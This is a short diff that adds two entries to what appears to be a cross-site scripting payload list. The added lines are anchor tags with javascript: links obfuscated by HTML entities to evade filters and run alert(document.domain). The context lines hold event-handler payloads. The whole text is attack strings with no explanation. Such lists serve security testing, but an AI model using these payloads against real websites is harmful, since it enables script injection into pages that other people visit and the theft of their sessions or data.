@@ -4,3 +4,5 @@
 ><tag onerror=a;alert(1)>
 ><tag onload=a;alert(1)>
 ><tag onload=a;alert(1)>
+<a+HREF='javascrip%26%239t:alert%26lpar;document.domain)'>test</a>
+<a Href='javascrip&#9t:alert&lpar;document.domain)'>test</a>
